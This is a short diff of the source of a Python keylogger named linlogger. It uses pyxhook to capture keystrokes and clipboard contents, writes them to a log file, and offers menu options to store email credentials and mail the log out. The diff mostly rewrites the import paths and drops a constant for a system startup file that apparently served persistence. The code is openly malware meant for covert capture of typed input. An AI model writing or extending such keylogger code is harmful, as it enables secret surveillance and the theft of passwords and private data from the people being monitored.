@@ -7,14 +7,13 @@ import sys
 import clipboard
 import pyxhook
 
-from linlogger import mailing
-from linlogger.cli import *
-from linlogger.files.management import *
+from mailing import *
+from cli import *
+from files.management import *
 
 
 LINLOGGER_FILE = os.path.abspath(os.path.basename(__file__))
 LOG_FILE = os.path.join(os.path.dirname(LINLOGGER_FILE), 'log.txt')
-SYSTEM_STARTUP_FILE = '/etc/init/startup.conf'
 
 char_list = []
 hook_manager = None
@@ -123,9 +122,9 @@ def main():
     menu()
     options = {
         'start': start_normally,
-        'set_email': mailing.set_credentials,
-        'check_email': mailing.check_credentials,
-        'send_log': functools.partial(mailing.send_file, LOG_FILE),
+        'set_email': set_credentials,
+        'check_email': check_credentials,
+        'send_log': functools.partial(send_file, LOG_FILE),
         'check_log': functools.partial(read_file, LOG_FILE),
         'remove_log': functools.partial(clean_file, LOG_FILE),
         'stop': stop,
@@ -141,3 +140,4 @@ def main():
 
 if __name__ == '__main__':
     main()
+
